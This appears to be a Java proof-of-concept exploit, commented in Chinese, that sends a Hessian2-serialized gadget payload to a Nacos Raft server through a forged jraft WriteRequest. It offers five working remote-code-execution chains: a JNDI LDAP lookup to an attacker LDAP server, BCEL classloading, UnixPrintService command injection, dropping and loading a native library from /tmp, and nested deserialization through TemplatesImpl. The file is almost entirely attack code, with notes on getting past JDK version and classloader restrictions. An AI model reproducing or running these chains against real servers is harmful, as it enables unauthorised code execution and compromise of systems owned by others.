package com.example;

import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alibaba.nacos.naming.core.v2.metadata.MetadataOperation;
import com.alipay.sofa.jraft.CliService;
import com.alipay.sofa.jraft.RaftServiceFactory;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Output;
import com.fasterxml.jackson.databind.node.POJONode;
import com.google.protobuf.ByteString;
import com.google.protobuf.Message;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.util.SerializationUtils;
import sun.print.UnixPrintService;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;

import javax.management.BadAttributeValueExpException;
import javax.swing.*;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class Demo {

    public static void main(String[] args) throws Exception {

        RouteTable rt = RouteTable.getInstance();
        Configuration conf = new Configuration();

        // 目标 nacos Raft Server
        PeerId peerId = new PeerId();
        peerId.parse("127.0.0.1:7848");

        String groupId = "naming_persistent_service_v2";

        conf.addPeer(peerId);

        // 初始化 CliService 和 CliClientService 客户端
        CliService cliService =  RaftServiceFactory.createAndInitCliService(new CliOptions());
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());

        // 刷新路由表
        rt.updateConfiguration(groupId, conf);

        rt.refreshLeader(cliClientService, groupId, 1000).isOk();

        Field parserClassesField = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClassesField.setAccessible(true);

        ConcurrentHashMap parserClasses = (ConcurrentHashMap) parserClassesField.get(cliClientService.getRpcClient());
        parserClasses.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());

        Field messagesField = MarshallerHelper.class.getDeclaredField("messages");
        messagesField.setAccessible(true);

        Map<String, Message> messages = (Map<String, Message>) messagesField.get(MarshallerHelper.class);
        messages.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());

        // 构造 payload
        HashMap map = getJNDIPayload("ldap://127.0.0.1:1389/x");

        // 防止反序列化类型转换报错, 实现多次利用
        MetadataOperation<HashMap> metadataOperation = new MetadataOperation<>();
        metadataOperation.setMetadata(map);
        byte[] payload = hessian2Serialize(metadataOperation);

        WriteRequest writeRequest = WriteRequest.newBuilder().setGroup(groupId).setData(ByteString.copyFrom(payload)).build();
        cliClientService.getRpcClient().invokeSync(peerId.getEndpoint(), writeRequest, 5000);
    }

    // 1. LDAP JNDI 注入 (出网)
    // < 8u191 JNDI Reference 加载 class 字节码
    // > 8u191 打 Jackson POJONode 原生反序列化
    public static HashMap getJNDIPayload(String url) throws Exception {
        SwingLazyValue swingLazyValue = new SwingLazyValue("javax.naming.InitialContext","doLookup",new String[]{url});

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", swingLazyValue);
        u2.put("aaa", swingLazyValue);

        return makeMap(u1, u2);
    }

    // 2. BCEL ClassLoader, 限制版本 < 8u251 (不出网)
    public static HashMap getBCELPayload(Class c) throws Exception {
        JavaClass clazz = Repository.lookupClass(c);
        String payload = "$$BCEL$$" + Utility.encode(clazz.getBytes(), true);

        SwingLazyValue swingLazyValue = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper","_main",new Object[]{new String[]{payload}});

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", swingLazyValue);
        u2.put("aaa", swingLazyValue);

        return makeMap(u1, u2);
    }

    // 3. UnixPrintService 命令注入 (不出网)
    public static HashMap getUnixPrintServicePayload(String command) throws Exception {
        Constructor constructor = UnixPrintService.class.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        UnixPrintService unixPrintService = (UnixPrintService) constructor.newInstance(";" + command);

        POJONode pojoNode = new POJONode(unixPrintService);

        Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = String.class.getDeclaredMethod("valueOf", Object.class);
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, new String("123"), new Object[]{pojoNode}}});

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", swingLazyValue);
        u2.put("aaa", swingLazyValue);

        return makeMap(u1, u2);
    }

    // 4. writeBytesToFilename + System.load (不出网)
    public static HashMap getSystemLoadPayload(String filename) throws Exception {
        byte[] content = Files.readAllBytes(Paths.get(filename));
        SwingLazyValue swingLazyValue1 = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"/tmp/exp.dylib", content});
        SwingLazyValue swingLazyValue2 = new SwingLazyValue("java.lang.System", "load", new Object[]{"/tmp/exp.dylib"});

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", swingLazyValue1);
        u2.put("aaa", swingLazyValue1);

        HashMap map1 = makeMap(u1, u2);

        UIDefaults u3 = new UIDefaults();
        UIDefaults u4 = new UIDefaults();
        u3.put("bbb", swingLazyValue2);
        u4.put("bbb", swingLazyValue2);

        HashMap map2 = makeMap(u3, u4);

        HashMap map = new HashMap();
        map.put(1, map1);
        map.put(2, map2);

        return map;
    }

    // 5. SerializationUtils 二次反序列化 (不出网)
    public static HashMap getSerializationUtilsPayload(Class c) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(c.getName());

        setFieldValue(templatesImpl, "_name", "Hello");
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        POJONode pojoNode = new POJONode(templatesImpl);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
        setFieldValue(poc, "val", pojoNode);

        byte[] data = serialize(poc);

        // 使用 ProxyLazyValue 调用非 rt.jar 内的方法, 绕过 ClassLoader 限制
        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue(SerializationUtils.class.getName(), "deserialize", new Object[]{data});

        Field accField = UIDefaults.ProxyLazyValue.class.getDeclaredField("acc");
        accField.setAccessible(true);
        accField.set(proxyLazyValue, null);

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", proxyLazyValue);
        u2.put("aaa", proxyLazyValue);

        // 或者使用 SwingLazyValue + MethodUtil 绕过
//        Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
//        Method m = SerializationUtils.class.getDeclaredMethod("deserialize", byte[].class);
//        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{m, null, new Object[]{data}}});
//
//        UIDefaults u1 = new UIDefaults();
//        UIDefaults u2 = new UIDefaults();
//        u1.put("aaa", swingLazyValue);
//        u2.put("aaa", swingLazyValue);

        return makeMap(u1, u2);
    }

    public static void setFieldValue(Object obj, String name, Object val) throws Exception{
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, val);
    }

    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
        HashMap<Object, Object> map = new HashMap<>();
        Method putValMethod = HashMap.class.getDeclaredMethod("putVal", int.class, Object.class, Object.class, boolean.class, boolean.class);
        putValMethod.setAccessible(true);
        putValMethod.invoke(map, 0, v1, 123, false, true);
        putValMethod.invoke(map, 1, v2, 123, false, true);
        return map;
    }

    public static byte[] serialize(Object obj) throws Exception{
        ByteArrayOutputStream arr = new ByteArrayOutputStream();
        try (ObjectOutputStream output = new ObjectOutputStream(arr)){
            output.writeObject(obj);
        }
        return arr.toByteArray();
    }

    public static byte[] hessian2Serialize(Object o) throws Exception {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(bao);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(o);
        output.flush();
        return bao.toByteArray();
    }
}
